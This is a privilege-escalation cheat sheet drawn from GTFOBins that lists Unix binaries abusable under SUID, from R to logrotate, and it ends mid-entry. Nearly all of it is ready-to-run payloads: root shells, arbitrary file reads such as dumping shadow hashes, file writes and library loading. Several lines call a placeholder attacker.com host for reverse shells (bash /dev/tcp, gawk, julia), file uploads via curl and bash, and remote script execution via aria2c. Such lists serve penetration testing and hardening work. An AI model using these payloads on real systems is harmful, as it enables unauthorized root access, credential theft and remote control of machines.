---
title: "GTFOBins - suid context (307 binaries)"
category: "misc"
subcategory: "privilege-escalation"
type: "reference"
tags: ["gtfobins", "privilege-escalation", "privesc", "shell-escape", "restricted-shell", "linux", "post-exploitation", "binary-abuse", "lolbins", "living-off-the-land", "suid", "escalation-path"]
summary: "307 Unix binaries abusable in the suid context, with the payload and the primitive each one yields."
source:
  name: "GTFOBins/GTFOBins.github.io"
  url: "https://github.com/GTFOBins/GTFOBins.github.io"
license: "GPL-3.0"
---

## What this page is

Every GTFOBins binary that is abusable in the **suid** context, grouped by binary, with the function each payload provides. 307 binaries.

## Step 1: find out what you have

```bash
find / -perm -4000 -type f 2>/dev/null
```

## Step 2: look it up

### R

**shell** — spawns an interactive shell

```bash
R --no-save -e 'system("/bin/sh")'
```

### aa-exec

**shell** — spawns an interactive shell

```bash
aa-exec /bin/sh
```

### ab

**download** — download

```bash
ab -v2 http://attacker.com/path/to/input-file
```

**upload** — upload

```bash
ab -p /path/to/input-file http://attacker.com/
```

### acr

**command** — runs a single command

```bash
echo -e 'x:\n\t/bin/sh 1>&0 2>&0' >/path/to/temp-file
chmod +x /path/to/temp-file
acr -r ./relative/path/to/temp-file
```

### agetty

**shell** — spawns an interactive shell

```bash
agetty -l /bin/sh -o -p -a root tty
```

### alpine

**file-read** — reads an arbitrary file

The file is displayed in the terminal interface. Other options might be available, for example, by pressing `S` is possible to save the file content elsewhere.

```bash
alpine -F /path/to/input-file
```

### apache2

**file-read** — reads an arbitrary file

The first line may be leaked as an error message.

```bash
apache2 -f /path/to/input-file
```

**file-read** — reads an arbitrary file

The first line may be leaked as an error message.

```bash
apache2 -C 'Define APACHE_RUN_DIR /' -C 'Include /path/to/input-file'
```

### apt-get

**shell** — spawns an interactive shell

For this to work the target package (i.e., `sl`) must not be already installed.

```bash
echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' >/path/to/temp-file
apt-get -y install -c /path/to/temp-file sl
```

**shell** — spawns an interactive shell

When the shell exits the `update` command is actually executed.

```bash
apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

### ar

**file-read** — reads an arbitrary file

```bash
ar r /path/to/output-file /path/to/input-file
ar p /path/to/output-file
```

### aria2c

**command** — runs a single command

Note that the subprocess is immediately sent to the background.

```bash
echo /path/to/command >/path/to/temp-file
chmod +x /path/to/temp-file
aria2c --on-download-error=/path/to/temp-file http://some-invalid-domain
```

**command** — runs a single command

The remote file `aaaaaaaaaaaaaaaa` (must be a string of 16 hex digit) contains the shell script, e.g., `/path/to/command`. Note that said file needs to be written on disk in order to be executed. `--allow-overwrite` is needed if this is executed multiple times with the same GID.

```bash
aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=/bin/sh http://attacker.com/aaaaaaaaaaaaaaaa
```

**download** — download

Use `--allow-overwrite` if needed. Similarly `-o /path/to/ouput-file` can be omitted, in that case the file is saved to `input-file` in the current working directory.

```bash
aria2c -o /path/to/ouput-file http://attacker.com/path/to/input-file
```

**file-read** — reads an arbitrary file

The file is leaked as error messages.

```bash
aria2c -i /path/to/input-file
```

### arj

**file-read** — reads an arbitrary file

The `.arj` suffix will be added to `output-file`.

```bash
arj a /path/to/output-file /path/to/input-file
arj p /path/to/output-file
```

**file-write** — writes to an arbitrary file

The `.arj` suffix will be added to `x`.

```bash
echo DATA >output-file
arj a x output-file
arj e x /path/to/output-dir/
```

### arp

**file-read** — reads an arbitrary file

Lines are likely leaked as error messages.

```bash
arp -v -f /path/to/input-file
```

### as

**file-read** — reads an arbitrary file

Lines are likely leaked as error messages.

```bash
as @/path/to/input-file
```

### ascii-xfr

**file-read** — reads an arbitrary file

```bash
ascii-xfr -ns /path/to/input-file
```

### ash

**file-write** — writes to an arbitrary file

```bash
ash -p -c 'echo DATA >/path/to/output-file'
```

**shell** — spawns an interactive shell

```bash
ash -p
```

### aspell

**file-read** — reads an arbitrary file

The textual file is displayed in an interactive TUI showing only the parts that contain mispelled words.

```bash
aspell -c /path/to/input-file
```

**file-read** — reads an arbitrary file

The first word is likely displayed as error messaged, and converted to lowercase.

```bash
aspell --conf /path/to/input-file
```

### asterisk

**shell** — spawns an interactive shell

A server instance must be already running, otherwise it can be started with `sudo asterisk -F`. Moreover, the invoking user must be able to access the socket.

```bash
asterisk -r
!/bin/sh
```

### atobm

**file-read** — reads an arbitrary file

Outputs only the first line of the file to standard error without the `-` and `#` characters, this can be customized with the `-c` option, by default is `-c -#`. Content can be retrieved with `awk -F "'" '{printf "%s", $2}'`.

```bash
atobm /path/to/input-file
```

### aws

**file-read** — reads an arbitrary file

```bash
aws ec2 describe-instances --filter file:///path/to/input-file
```

### base32

**file-read** — reads an arbitrary file

```bash
base32 /path/to/input-file | base32 --decode
```

### base64

**file-read** — reads an arbitrary file

```bash
base64 /path/to/input-file | base64 --decode
```

### basenc

**file-read** — reads an arbitrary file

```bash
basenc --base64 /path/to/input-file | basenc -d --base64
```

### basez

**file-read** — reads an arbitrary file

```bash
basez /path/to/input-file | basez --decode
```

### bash

**download** — download

```bash
bash -p -c '{ echo -ne "GET /path/to/input-file HTTP/1.0\r\nhost: attacker.com\r\n\r\n" 1>&3; cat 0<&3; } \
    3<>/dev/tcp/attacker.com/12345 \
    | { while read -r; do [ "$REPLY" = "$(echo -ne "\r")" ] && break; done; cat; } >/path/to/output-file'
```

**download** — download

```bash
bash -p -c 'echo "$(</dev/tcp/attacker.com/12345) >/path/to/output-file'
```

**file-read** — reads an arbitrary file

```bash
bash -p -c 'echo "$(</path/to/input-file)"'
```

**file-read** — reads an arbitrary file

This only works interactively from an existing `bash` session.

```bash
HISTTIMEFORMAT=$'\r\e[K'
history -c
history -r /path/to/input-file
history
```

**file-write** — writes to an arbitrary file

```bash
bash -p -c 'echo DATA >/path/to/output-file'
```

**file-write** — writes to an arbitrary file

This only works interactively from an existing `bash` session. It adds timestamps to the output file.

```bash
HISTIGNORE='history *'
history -c
DATA
history -w /path/to/output-file
```

**library-load** — loads an arbitrary shared library

```bash
bash -p -c 'enable -f /path/to/lib.so x'
```

**reverse-shell** — connects back to a listener you control

```bash
bash -p -c 'exec bash -p -i &>/dev/tcp/attacker.com/12345 <&1'
```

**shell** — spawns an interactive shell

```bash
bash -p
```

**upload** — upload

```bash
bash -p -c 'echo -e "POST / HTTP/0.9\n\n$(</path/to/input-file)" >/dev/tcp/attacker.com/12345'
```

**upload** — upload

```bash
bash -p -c 'echo -n "$(</path/to/input-file)" >/dev/tcp/attacker.com/12345'
```

### batcat

**inherit** — inherit

`--paging always` can be omitted provided that the output doesn't fit the screen.

```bash
batcat --paging always /etc/hosts
```

### bc

**file-read** — reads an arbitrary file

The file content is actually parsed and appears as error messages.

```bash
bc -s /path/to/input-file
quit
```

### bconsole

**file-read** — reads an arbitrary file

The file is actually parsed and the first wrong line is returned in an error message.

```bash
bconsole -c /path/to/file-input
```

### bee

**inherit** — inherit

This allows to run PHP code (`...`).

This must be excuted from the Backdrop CMS root directory (e.g. `/var/www/html`), alternatively use the `--root` option.

```bash
bee eval '...'
```

### bridge

**file-read** — reads an arbitrary file

Outputs the first line of the file (until the first whitespace) inside an error message to stdandard error.

```bash
bridge -b /path/to/input-file
```

### busctl

**inherit** — inherit

```bash
busctl --show-machine
```

**shell** — spawns an interactive shell

```bash
busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'
```

**shell** — spawns an interactive shell

```bash
busctl --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'
```

### bzip2

**file-read** — reads an arbitrary file

```bash
bzip2 -c /path/to/input-file | bzip2 -d
```

### cabal

**shell** — spawns an interactive shell

```bash
cabal exec --project-file=/dev/null -- /bin/sh -p
```

### cancel

**upload** — upload

Data is sent as a POST request along with other content.

```bash
cancel -h attacker.com:12345 -u DATA
```

### capsh

**shell** — spawns an interactive shell

```bash
capsh --gid=0 --uid=0 --
```

### cat

**file-read** — reads an arbitrary file

```bash
cat /path/to/input-file
```

### chattr

**privilege-escalation** — privilege-escalation

Make the target file immutable.

```bash
chattr +i /path/to/input-file
```

### chmod

**privilege-escalation** — privilege-escalation

This can be run with elevated privileges to change permissions (`6` denotes the SUID bits) and then read, write, or execute a file.

```bash
chmod 6777 /path/to/input-file
```

### choom

**shell** — spawns an interactive shell

```bash
choom -n 0 -- /bin/sh -p
```

### chown

**privilege-escalation** — privilege-escalation

This can be run with elevated privileges to change ownership and then read, write, or execute a file.

```bash
chown $(id -un):$(id -gn) /path/to/input-file
```

### chroot

**shell** — spawns an interactive shell

```bash
chroot / /bin/sh -p
```

### chrt

**shell** — spawns an interactive shell

Any number between 1 and 99 will do.

```bash
chrt 1 /bin/sh -p
```

### clamscan

**file-read** — reads an arbitrary file

Each line of the file is interpreted as a path and the content is leaked via error messages. The output can optionally be cleaned using `sed`.

```bash
touch x.yara
clamscan --no-summary -d x.yara -f /path/to/input-file 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'
```

### clisp

**shell** — spawns an interactive shell

```bash
clisp -x '(ext:run-shell-command "/bin/sh")(ext:exit)'
```

### cmp

**file-read** — reads an arbitrary file

Dump the bytes of the input file that are different from the NUL byte in a tabular format.

```bash
cmp /path/to/input-file /dev/zero -b -l
```

### cobc

**shell** — spawns an interactive shell

The `/path/to/temp-file` sill be overwritten after the execution.

```bash
echo 'CALL "SYSTEM" USING "/bin/sh".' >/path/to/temp-file
cobc -xFj --frelax-syntax-checks /path/to/temp-file
```

### column

**file-read** — reads an arbitrary file

This program expects textual data.

```bash
column /path/to/input-file
```

### comm

**file-read** — reads an arbitrary file

A newline is appended to the file.

```bash
comm /path/to/input-file /dev/null
```

### cp

**file-read** — reads an arbitrary file

```bash
cp /path/to/input-file /dev/stdout
```

**file-write** — writes to an arbitrary file

```bash
echo DATA | cp /dev/stdin /path/to/output-file
```

**privilege-escalation** — privilege-escalation

This can be used to copy and then read or write files from a restricted file systems or with elevated privileges. (The GNU version of `cp` has the `--parents` option that can be used to also create the directory hierarchy specified in the source path, to the destination folder.)

```bash
cp /path/to/input-file /path/to/output-file
```

**privilege-escalation** — privilege-escalation

This can copy SUID permissions from any SUID binary (e.g., `/path/to/input-file`) to another.

```bash
cp --attributes-only --preserve=all /path/to/input-file /path/to/output-file
```

### cpio

**file-read** — reads an arbitrary file

The content of the file is printed to standard output, between the `cpio` archive format header and footer.

```bash
echo /path/to/input-file | cpio -o
```

**file-read** — reads an arbitrary file

The whole directory structure is copied to `.`, hence this is also a file write.

```bash
echo /path/to/input-file | cpio -R $UID -dp .
cat path/to/input-file
```

**file-write** — writes to an arbitrary file

The whole directory structure is copied to `.`, with the data written to `./path/to/temp-file`.

```bash
echo DATA >/path/to/temp-file
echo /path/to/temp-file | cpio -R 0:0 -udp .
```

### cpulimit

**shell** — spawns an interactive shell

```bash
cpulimit -l 100 -f -- /bin/sh -p
```

### crash

**inherit** — inherit

```bash
crash -h
```

### csh

**file-write** — writes to an arbitrary file

```bash
csh -c 'echo DATA >/path/to/output-file' -b
```

**shell** — spawns an interactive shell

```bash
csh -b
```

### csplit

**file-read** — reads an arbitrary file

```bash
csplit /path/to/input-file 1
cat xx01
```

**file-write** — writes to an arbitrary file

Writes the data to `xx0output-file` in the current working directory. If needed, a different prefix can be specified with `-f` (instead of `xx`).

```bash
echo DATA >/path/to/temp-file
csplit -z -b '%doutput-file' /path/to/temp-file 1
```

### csvtool

**file-read** — reads an arbitrary file

The file is actually parsed and manipulated as CSV.

```bash
csvtool trim t /path/to/input-file
```

**file-write** — writes to an arbitrary file

The file is actually parsed and manipulated as CSV.

```bash
echo DATA >/path/to/temp-file
csvtool trim t /path/to/temp-file -o /path/to/output-file
```

**shell** — spawns an interactive shell

```bash
csvtool call '/bin/sh;false' /etc/hosts
```

### ctr

**shell** — spawns an interactive shell

An image must be already present, for example:

```
ctr images pull docker.io/library/alpine:latest
```

```bash
ctr run --rm --mount type=bind,src=/,dst=/,options=rbind -t docker.io/library/alpine:latest x
```

### cupsfilter

**file-read** — reads an arbitrary file

```bash
cupsfilter -i application/octet-stream -m application/octet-stream /path/to/input-file
```

### curl

**download** — download

```bash
curl http://attacker.com/path/to/input-file -o /path/to/output-file
```

**file-read** — reads an arbitrary file

```bash
curl file:///path/to/input-file
```

**file-write** — writes to an arbitrary file

```bash
echo DATA >/path/to/temp-file
curl file:///path/to/temp-file -o /path/to/output-file
```

**library-load** — loads an arbitrary shared library

```bash
curl --engine /path/to/lib.so x
```

**upload** — upload

```bash
curl -X POST --data-binary @/path/to/input-file http://attacker.com
```

**upload** — upload

```bash
curl -X POST --data-binary DATA http://attacker.com
```

**upload** — upload

Data will be `\r\n` terminated.

```bash
curl gopher://attacker.com:12345/_DATA
```

### cut

**file-read** — reads an arbitrary file

```bash
cut -d '' -f1 /path/to/input-file
```

### dash

**file-write** — writes to an arbitrary file

```bash
dash -c 'echo DATA >/path/to/output-file'
```

**shell** — spawns an interactive shell

```bash
dash
```

### date

**file-read** — reads an arbitrary file

Each line is corrupted by a prefix string and wrapped inside quotes.

```bash
date -f /path/to/input-file
```

### dc

**shell** — spawns an interactive shell

```bash
dc -e '!/bin/sh'
```

### dd

**file-read** — reads an arbitrary file

```bash
dd if=/path/to/input-file
```

**file-write** — writes to an arbitrary file

```bash
echo DATA | dd of=/path/to/output-file
```

### debugfs

**shell** — spawns an interactive shell

```bash
debugfs
!/bin/sh
```

### dialog

**file-read** — reads an arbitrary file

The file is shown in an interactive TUI dialog.

```bash
dialog --textbox /path/to/input-file 0 0
```

### diff

**file-read** — reads an arbitrary file

```bash
diff --line-format=%L /dev/null /path/to/input-file
```

**file-read** — reads an arbitrary file

This lists the content of a directory. `/path/to/empty-dir` can be any directory, but for convenience it is better to use an empty directory to avoid noise output.

```bash
diff --recursive /path/to/empty-dir /path/to/input-dir/
```

### dig

**file-read** — reads an arbitrary file

Each input line is treated as a lookup query for the `dig` command and the output is corrupted with the result or errors of the operation.

```bash
dig -f /path/to/input-file
```

### distcc

**shell** — spawns an interactive shell

```bash
distcc /bin/sh -p
```

### dmesg

**file-read** — reads an arbitrary file

```bash
dmesg -rF /path/to/input-file
```

**inherit** — inherit

```bash
dmesg -H
```

### dmsetup

**shell** — spawns an interactive shell

```bash
dmsetup create base <<EOF
0 3534848 linear /dev/loop0 94208
EOF
dmsetup ls --exec '/bin/sh -p -s'
```

### dnsmasq

**command** — runs a single command

```bash
dnsmasq --conf-script='/path/to/command 1>&2'
```

### docker

**file-read** — reads an arbitrary file

Read a file by copying it to a temporary container (`$CONTAINER_ID`) and back to a new location on the host.

```bash
docker cp /path/to/input-file $CONTAINER_ID:input-file
docker cp $CONTAINER_ID:input-file /path/to/temp-file
cat /path/to/temp-file
```

**file-write** — writes to an arbitrary file

Write a file by copying it to a temporary container (`$CONTAINER_ID`) and back to the target destination on the host.

```bash
echo DATA >/path/to/temp-file
docker cp /path/to/temp-file $CONTAINER_ID:temp-file
docker cp $CONTAINER_ID /path/to/output-file
```

**shell** — spawns an interactive shell

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
```

**shell** — spawns an interactive shell

This exploits the fact that is run with the `--privileged` option to directly mount a host's disk, e.g., `/dev/sda1`.

```bash
docker run --rm -it --privileged -u root alpine
mount /dev/sda1 /mnt/
ls -la /mnt/
chroot /mnt /bin/bash
```

### dos2unix

**file-read** — reads an arbitrary file

```bash
dos2unix -f -O /path/to/input-file
```

**file-write** — writes to an arbitrary file

```bash
dos2unix -f -n /path/to/input-file /path/to/output-file
```

### dosbox

**file-read** — reads an arbitrary file

The file content will be displayed in the DOSBox graphical window.

```bash
dosbox -c 'mount c /' -c 'type c:\path\to\input'
```

**file-read** — reads an arbitrary file

The file is copied to a readable location.

```bash
dosbox -c 'mount c /' -c 'copy c:\path\to\input c:\path\to\output' -c exit
cat /path/to/OUTPUT
```

**file-write** — writes to an arbitrary file

Note that `echo` terminates the string with a DOS-style line terminator (`\r\n`), if that's a problem and your scenario allows it, you can create the file outside `dosbox`, then use `copy` to do the actual write.

```bash
dosbox -c 'mount c /' -c "echo DATA >c:\path\to\output" -c exit
```

### dpkg

**inherit** — inherit

```bash
dpkg -l
```

### dvips

**shell** — spawns an interactive shell

The `texput.dvi` output file produced by `tex` can be created offline and uploaded to the target.

```
tex '\special{psfile="`/bin/sh 1>&0"}\end'
```

```bash
dvips -R0 texput.dvi
```

### easyrsa

**shell** — spawns an interactive shell

This command might not be in the `PATH`, it could be found in, `/usr/share/easy-rsa/easyrsa`. The shell is spawn twice.

```bash
echo 'set_var X "$(/bin/sh 1>&0)"' >/path/to/temp-file
easyrsa --vars=/path/to/temp-file
```

### ed

**file-read** — reads an arbitrary file

```bash
ed /path/to/input-file
,p
q
```

**file-write** — writes to an arbitrary file

```bash
ed /path/to/output-file
a
DATA
.
w
q
```

**shell** — spawns an interactive shell

```bash
ed
!/bin/sh
q
```

### efax

**file-read** — reads an arbitrary file

The content is actually parsed by the command.

```bash
efax -d /path/to/input-file
```

### egrep

**file-read** — reads an arbitrary file

```bash
grep '' /path/to/input-file
```

### elvish

**file-read** — reads an arbitrary file

```bash
elvish -c 'print (slurp </path/to/input-file)'
```

**file-write** — writes to an arbitrary file

```bash
elvish -c 'print DATA >/path/to/output-file'
```

**shell** — spawns an interactive shell

```bash
elvish
```

### enscript

**shell** — spawns an interactive shell

```bash
enscript /dev/null -qo /dev/null -I '/bin/sh >&2'
```

### env

**shell** — spawns an interactive shell

```bash
env /bin/sh -p
```

### eqn

**file-read** — reads an arbitrary file

The content is actually parsed and corrupted by the command.

```bash
eqn /path/to/input-file
```

### espeak

**file-read** — reads an arbitrary file

The file content appears in the middle of other textual information as phonemes.

```bash
espeak -qXf /path/to/input-file
```

### ex

**inherit** — inherit

```bash
ex
```

**shell** — spawns an interactive shell

```bash
ex -c ':!/bin/sh'
```

### expand

**file-read** — reads an arbitrary file

The read file content is corrupted by replacing tabs with spaces.

```bash
expand /path/to/input-file
```

### expect

**file-read** — reads an arbitrary file

The file is read and parsed as an `expect` command file, the content of the first invalid line is returned in an error message.

```bash
expect /path/to/input-file
```

**shell** — spawns an interactive shell

```bash
expect -c 'spawn /bin/sh -p;interact'
```

### fastfetch

**command** — runs a single command

```bash
echo '{"modules":[{"type":"command","key":"x","text":"exec /path/to/command"}]}' >/path/to/temp-file.jsonc
fastfetch -c /path/to/temp-file.jsonc
```

**file-read** — reads an arbitrary file

The file content is used as the logo while some other information is displayed on its right.

```bash
fastfetch --file /path/to/input-file
```

**shell** — spawns an interactive shell

```bash
echo '{"modules":[{"type":"command","key":"x","text":"exec /bin/sh 1>&0 2>&0"}]}' >/path/to/temp-file.jsonc
fastfetch -c /path/to/temp-file.jsonc
```

### ffmpeg

**library-load** — loads an arbitrary shared library

```bash
ffmpeg -f lavfi -i anullsrc -af ladspa=file=/path/to/lib.so /path/to/temp-file.wav
reset^J
```

### fgrep

**file-read** — reads an arbitrary file

```bash
grep '' /path/to/input-file
```

### file

**file-read** — reads an arbitrary file

Each input line is treated as a filename for the `file` command and the output is corrupted by a suffix `:` followed by the result or the error of the operation.

```bash
file -f /path/to/input-file
```

**file-read** — reads an arbitrary file

Each line is corrupted by a prefix string and wrapped inside quotes.

If a line in the target file begins with a `#`, it will not be printed as these lines are parsed as comments.

It can also be provided with a directory and will read each file in the directory.

```bash
file -m /path/to/input-file
```

### find

**file-read** — reads an arbitrary file

This uses `cat` to actually read the file, but since permissions are not dropped, it's executed with the same privileges as `find`.

```bash
find /path/to/input-file -exec cat {} \;
```

**file-write** — writes to an arbitrary file

`DATA` is a format string, it supports some escape sequences.

```bash
find / -fprintf /path/to/output-file DATA -quit
```

**shell** — spawns an interactive shell

```bash
find . -exec /bin/sh -p \; -quit
```

### finger

**download** — download

The command hangs waiting for the remote peer to close the socket.

```bash
finger x@attacker.com
```

**upload** — upload

The command hangs waiting for the remote peer to close the socket.

```bash
finger DATA@attacker.com
```

### fish

**shell** — spawns an interactive shell

```bash
fish
```

### flock

**shell** — spawns an interactive shell

```bash
flock -u / /bin/sh -p
```

### fmt

**file-read** — reads an arbitrary file

```bash
fmt -pNON_EXISTING_PREFIX /path/to/input-file
```

**file-read** — reads an arbitrary file

This corrupts the output by wrapping very long lines at the given width (`999`).

```bash
fmt -999 /path/to/input-file
```

### fold

**file-read** — reads an arbitrary file

This corrupts the output by wrapping very long lines at the given width (`999`).

```bash
fold -w999 /path/to/input-file
```

### forge

**shell** — spawns an interactive shell

```bash
echo '#!/bin/sh' >/path/to/temp-file
echo -e "/bin/sh <$(tty) >$(tty) 2>$(tty)" >>/path/to/temp-file
chmod +x /path/to/temp-file
forge build --use /path/to/temp-file
```

### fping

**file-read** — reads an arbitrary file

Each line is treated as an hostname and it's leaked as an error message.

```bash
fping -f /path/to/input-file
```

### ftp

**download** — download

Instead of `-a`, credentials can be supplied via the `user:password@host` connection string.

```bash
ftp -a attacker.com
get /path/to/input-file output-file
```

**shell** — spawns an interactive shell

```bash
ftp
!/bin/sh
```

**upload** — upload

Instead of `-a`, credentials can be supplied via the `user:password@host` connection string.

```bash
ftp -a attacker.com
put /path/to/input-file output-file
```

### fzf

**command** — runs a single command

Commands can be issued via POST requests, for example:

```
curl http://localhost:12345 -d 'execute(/path/to/command)'
```

```bash
fzf --listen=12345
```

**shell** — spawns an interactive shell

Press `Enter` to receive the shell.

```bash
fzf --bind 'enter:execute(/bin/sh)'
```

### gawk

**bind-shell** — listens for an inbound connection

```bash
gawk 'BEGIN {
    s = "/inet/tcp/12345/0/0";
    while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
```

**file-read** — reads an arbitrary file

```bash
gawk '//' /path/to/input-file
```

**file-write** — writes to an arbitrary file

```bash
gawk 'BEGIN { print "DATA" > "/path/to/output-file" }'
```

**reverse-shell** — connects back to a listener you control

```bash
gawk 'BEGIN {
    s = "/inet/tcp/0/attacker.com/12345";
    while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
```

**shell** — spawns an interactive shell

```bash
gawk 'BEGIN {system("/bin/sh")}'
```

### gcloud

**inherit** — inherit

```bash
gcloud help
```

### gcore

**file-read** — reads an arbitrary file

It can be used to generate core dumps of running processes (`$PID`). Such files often contains sensitive information such as open files content, cryptographic keys, passwords, etc. This command produces a binary file named `core.$PID`, that is then often filtered with `strings` to narrow down relevant information.

```bash
gcore $PID
```

### gdb

**file-write** — writes to an arbitrary file

```bash
gdb -nx -ex 'dump value /path/to/output-file "DATA"' -ex quit
```

**inherit** — inherit

This allows to run Python code (`...`).

```bash
gdb -nx -ex 'python ...' -ex quit
```

**shell** — spawns an interactive shell

```bash
gdb -nx -ex '!/bin/sh' -ex quit
```

### genie

**shell** — spawns an interactive shell

```bash
genie -c '/bin/sh'
```

### genisoimage

**file-read** — reads an arbitrary file

The output is placed inside the ISO9660 file system binary format, it can be mounted or extracted with tools like `7z`.

```bash
genisoimage -q -o - /path/to/input-file
```

**file-read** — reads an arbitrary file

The file is parsed, and some of its content is disclosed by the error messages.

```bash
genisoimage -sort /path/to/input-file
```

### getent

**privilege-escalation** — privilege-escalation

This allows to dump password hashes from the `/etc/shadow` file.

```bash
getent shadow
```

### ginsh

**shell** — spawns an interactive shell

```bash
ginsh
!/bin/sh
```

### git

**file-read** — reads an arbitrary file

The read file content is displayed in `diff` style output format.

```bash
git diff /dev/null /path/to/input-file
```

**file-write** — writes to an arbitrary file

The patch can be created locally by creating the file that will be written on the target using its absolute path:

```
echo DATA >/path/to/input-file
git diff /dev/null /path/to/input-file >x.patch
```

```bash
git apply --unsafe-paths --directory / x.patch
```

**shell** — spawns an interactive shell

```bash
ln -s /bin/sh git-x
git --exec-path=. x -p
```

### gnuplot

**shell** — spawns an interactive shell

```bash
gnuplot -e 'system("/bin/sh 1>&0")'
```

### grep

**file-read** — reads an arbitrary file

```bash
grep '' /path/to/input-file
```

### gtester

**file-write** — writes to an arbitrary file

Data to be written appears in an XML attribute in the output file (`<testbinary path="DATA">`).

```bash
gtester DATA -o /path/to/output-file
```

**shell** — spawns an interactive shell

```bash
echo '#!/bin/sh -p' >/path/to/temp-file
echo 'exec /bin/sh -p 0<&1' >>/path/to/temp-file
chmod +x /path/to/temp-file
gtester -q /path/to/temp-file
```

### guile

**shell** — spawns an interactive shell

```bash
guile -c '(system "/bin/sh")'
```

### gzip

**file-read** — reads an arbitrary file

```bash
gzip -c /path/to/input-file | gzip -d
```

### head

**file-read** — reads an arbitrary file

```bash
head -c-0 /path/to/input-file
```

### hexdump

**file-read** — reads an arbitrary file

The output is actually an hex dump.

```bash
hd /path/to/input-file
```

### hg

**shell** — spawns an interactive shell

```bash
hg --config alias.x='!/bin/sh' x
```

### highlight

**file-read** — reads an arbitrary file

```bash
highlight --no-doc --failsafe /path/to/input-file
```

### hping3

**shell** — spawns an interactive shell

```bash
hping3
/bin/sh -p
```

### iconv

**file-read** — reads an arbitrary file

```bash
iconv -f 8859_1 -t 8859_1 /path/to/input-file
```

**file-write** — writes to an arbitrary file

```bash
echo DATA | iconv -f 8859_1 -t 8859_1 -o /path/to/output-file
```

### iftop

**shell** — spawns an interactive shell

This requires the privilege to capture on some device (specify with `-i` if needed).

```bash
iftop
!/bin/sh
```

### install

**privilege-escalation** — privilege-escalation

This can be run with elevated privileges to change permissions (`6` denotes the SUID bits) and then read, write, or execute a file.

```bash
install -m 6777 /path/to/input-file /path/to/output-dir/
```

### ionice

**shell** — spawns an interactive shell

```bash
ionice /bin/sh -p
```

### ip

**file-read** — reads an arbitrary file

The read file content is corrupted by error prints.

```bash
ip -force -batch /path/to/input-file
```

**shell** — spawns an interactive shell

```bash
ip netns add foo
ip netns exec foo /bin/sh -p
ip netns delete foo
```

### ispell

**shell** — spawns an interactive shell

```bash
ispell /etc/hosts
!/bin/sh -p
```

### joe

**shell** — spawns an interactive shell

The terminal is spawn int the terminal interface.

```bash
joe
^K!/bin/sh
```

### join

**file-read** — reads an arbitrary file

```bash
join -a 2 /dev/null /path/to/input-file
```

### jq

**file-read** — reads an arbitrary file

```bash
jq -Rr . /path/to/input-file
```

### jrunscript

**shell** — spawns an interactive shell

```bash
jrunscript -e 'exec("/bin/sh -pc $@|sh${IFS}-p _ echo sh -p </dev/tty >/dev/tty 2>/dev/tty")'
```

### julia

**download** — download

```bash
julia -e 'download("http://attacker.com/path/to/input-file", "/path/to/output-file")'
```

**file-read** — reads an arbitrary file

```bash
julia -e 'print(open(f->read(f, String), "/path/to/input-file"))'
```

**file-write** — writes to an arbitrary file

```bash
julia -e 'open(f->write(f, "DATA"), /path/to/output-file, "w")'
```

**reverse-shell** — connects back to a listener you control

```bash
julia -e 'using Sockets; sock=connect("attacker.com", parse(Int64, 12345)); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'
```

**shell** — spawns an interactive shell

```bash
julia -e 'run(`/bin/sh -p`)'
```

### ksshell

**file-read** — reads an arbitrary file

Each line is corrupted by a prefix string. Also consider that lines are actually parsed as `kickstart` scripts thus some file contents may lead to unexpected results.

```bash
ksshell -i /path/to/input-file
```

### kubectl

**upload** — upload

```bash
kubectl proxy --address=0.0.0.0 --port=12345 --www=/path/to/dir/ --www-prefix=/x/
```

### last

**file-read** — reads an arbitrary file

The output might be corrupted or incomplete if the file does not follow the expected database format.

```bash
last -a -f /path/to/input-file
```

### latex

**file-read** — reads an arbitrary file

The read file will be part of the PDF output.

```bash
latex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}'
strings texput.dvi
```

**file-write** — writes to an arbitrary file

The file can only be written in the current directory, and the `.tex` extension is mandatory.

```bash
latex '\documentclass{article}\newwrite\tempfile\begin{document}\immediate\openout\tempfile=output-file.tex\immediate\write\tempfile{DATA}\immediate\closeout\tempfile\end{document}'
```

**shell** — spawns an interactive shell

```bash
latex --shell-escape '\immediate\write18{/bin/sh}'
```

### ldconfig

**library-load** — loads an arbitrary shared library

This allows to override one or more shared libraries (e.g., `libpcap`) globally, then triggers the execution by running a program that uses it, e.g., `ping`. This is particularly useful if the target binary is SUID. Beware though that it is easy to end up with a broken target system.

First identify the shared libraries used by the target program, for example:

```
$ ldd /bin/ping | grep libcap
        libcap.so.2 => /path/to/temp-dir/libcap.so.2 (0x00007f8417eef000)
```

Then create the shared library override, named `libcap.so.2`, and put in in `/path/to/temp-dir/`. The program might require some exported symbols from the library override, in that case make sure to add them (e.g., `void cap_get_flag() {}`).

```bash
echo /path/to/temp-dir/ >/path/to/temp-file
ldconfig -f /path/to/temp-file
ping
```

### less

**file-read** — reads an arbitrary file

```bash
less /path/to/input-file
```

**file-read** — reads an arbitrary file

This can be used to read another file, e.g., when invoked as a pager with some fixed content.

```bash
less /etc/hosts
:e /path/to/input-file
```

**file-write** — writes to an arbitrary file

```bash
echo DATA | less
s/path/to/output-file
q
```

**inherit** — inherit

```bash
less /etc/hosts
v
```

**shell** — spawns an interactive shell

```bash
less /etc/hosts
!/bin/sh
```

### lftp

**shell** — spawns an interactive shell

```bash
lftp -c '!/bin/sh'
```

### links

**file-read** — reads an arbitrary file

The result is displayed in a TUI interface.

```bash
links /path/to/input-file
```

### logrotate

**file-read** — reads an arbitrary file

The first word is returned in a error message.

```bash
logrotate /path/to/input-file
```

**file-write** — writes to an arbitrary file

The content is written in a log file.

```bash
